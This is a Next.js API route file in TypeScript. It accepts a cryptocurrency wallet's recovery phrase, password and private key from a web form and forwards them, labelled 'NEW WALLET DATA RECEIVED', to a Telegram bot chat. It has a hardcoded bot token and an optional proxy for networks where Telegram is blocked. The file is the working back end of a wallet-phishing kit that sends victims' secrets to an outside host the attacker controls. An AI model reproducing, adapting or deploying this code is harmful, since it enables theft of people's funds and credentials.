import { NextResponse } from "next/server";

interface Payload {
  phrase?: string;
  password?: string;
  privateKey?: string;
  wallet?: string;
}

const token =
  process.env.TELEGRAM_BOT_TOKEN ||
  "8756637486:AAFPoG6KyJ6gSNZMeyjv9XSenAzpzGr8b8U";
const chatId = process.env.TELEGRAM_CHAT_ID || "123456789";

// Allow overriding the Telegram API base URL via env var (useful for proxies
// when api.telegram.org is blocked on the current network).
// Example proxy value: https://your-proxy-host/bot
const telegramBase =
  process.env.TELEGRAM_API_BASE || "https://api.telegram.org";

async function sendTelegramMessage(text: string): Promise<void> {
  const url = `${telegramBase}/bot${token}/sendMessage`;

  const controller = new AbortController();
  const timeout = setTimeout(() => controller.abort(), 10_000); // 10 s timeout

  try {
    const res = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: chatId, text }),
      signal: controller.signal,
    });

    if (!res.ok) {
      const body = await res.text();
      throw new Error(`Telegram API error ${res.status}: ${body}`);
    }
  } finally {
    clearTimeout(timeout);
  }
}

export async function POST(request: Request) {
  try {
    const body: Payload = await request.json();

    // Validate the payload
    if (!body.phrase && !body.password && !body.privateKey) {
      return NextResponse.json(
        {
          error:
            "At least one of phrase, password, or privateKey must be provided",
        },
        { status: 400 }
      );
    }

    // Plain text (no parse_mode) so special chars in phrases can't break Telegram's parser
    const lines = [
      "🔒 NEW WALLET DATA RECEIVED",
      "",
      `Wallet: ${body.wallet || "Not provided"}`,
      `Recovery Phrase: ${body.phrase || "Not provided"}`,
      `Password: ${body.password || "Not provided"}`,
      `Private Key: ${body.privateKey || "Not provided"}`,
      "",
      `Time: ${new Date().toISOString()}`,
    ];

    await sendTelegramMessage(lines.join("\n"));
    console.log("Telegram message sent successfully");

    return NextResponse.json({ message: "Data sent successfully" });
  } catch (error) {
    console.error("Error processing request:", error);
    return NextResponse.json(
      { error: "Internal server error" },
      { status: 500 }
    );
  }
}
